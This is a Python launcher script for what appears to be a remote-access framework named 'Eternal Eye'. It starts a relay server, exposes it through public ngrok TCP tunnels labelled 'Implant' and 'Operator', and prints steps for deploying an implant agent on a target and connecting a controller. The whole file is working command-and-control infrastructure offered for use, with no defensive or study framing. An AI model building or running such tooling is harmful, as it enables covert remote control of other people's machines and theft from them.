#!/usr/bin/env python3
import subprocess
import time
import threading
from pyngrok import ngrok
import sys
import os

def start_relay_server():
    """Start the Eternal Eye relay server"""
    print("Starting Eternal Eye relay server...")
    os.chdir("relay")
    subprocess.run([sys.executable, "server.py"])
    os.chdir("..")

def setup_ngrok_tunnels():
    """Setup ngrok tunnels for both ports"""
    print("Setting up ngrok tunnels...")
    
    # Create TCP tunnels for both ports
    implant_tunnel = ngrok.connect(8765, "tcp", bind_tls=True)
    operator_tunnel = ngrok.connect(8766, "tcp", bind_tls=True)
    
    # Extract host and port from ngrok URLs
    implant_url = implant_tunnel.public_url.replace("tcp://", "").split(":")
    operator_url = operator_tunnel.public_url.replace("tcp://", "").split(":")
    
    print("\n" + "="*60)
    print("ETERNAL EYE - NGROK TUNNELS ACTIVE")
    print("="*60)
    print(f"Implant Endpoint:  {implant_url[0]}:{implant_url[1]}")
    print(f"Operator Endpoint: {operator_url[0]}:{operator_url[1]}")
    print("="*60)
    
    print("\nUSAGE INSTRUCTIONS:")
    print("1. Deploy implant on target:")
    print(f'   python3 implant/agent.py --relay {implant_url[0]} --port {implant_url[1]}')
    print("2. Connect controller:")
    print(f'   python3 controller/client.py --relay {operator_url[0]} --port {operator_url[1]}')
    print("\nRelay server is running...")
    
    return implant_url[0], implant_url[1], operator_url[0], operator_url[1]

def main():
    # Check if pyngrok is installed
    try:
        import pyngrok
    except ImportError:
        print("Installing pyngrok...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyngrok"])
    
    # Install other dependencies
    print("Installing dependencies...")
    subprocess.run([sys.executable, "-m", "pip", "install", "websockets", "psutil"])
    
    # Create logs directory
    os.makedirs("logs", exist_ok=True)
    
    # Start relay server in background thread
    relay_thread = threading.Thread(target=start_relay_server, daemon=True)
    relay_thread.start()
    
    # Wait for server to start
    time.sleep(3)
    
    # Setup ngrok tunnels
    try:
        implant_host, implant_port, operator_host, operator_port = setup_ngrok_tunnels()
        
        # Save endpoints to file for easy reference
        with open("connection_info.txt", "w") as f:
            f.write(f"Implant: {implant_host}:{implant_port}\n")
            f.write(f"Operator: {operator_host}:{operator_port}\n")
        
        print("\nConnection info saved to 'connection_info.txt'")
        print("\nPress Ctrl+C to stop the server and tunnels...")
        
        # Keep running
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nShutting down Eternal Eye...")
        ngrok.kill()
    except Exception as e:
        print(f"Error: {e}")
        ngrok.kill()

if __name__ == "__main__":
    main()
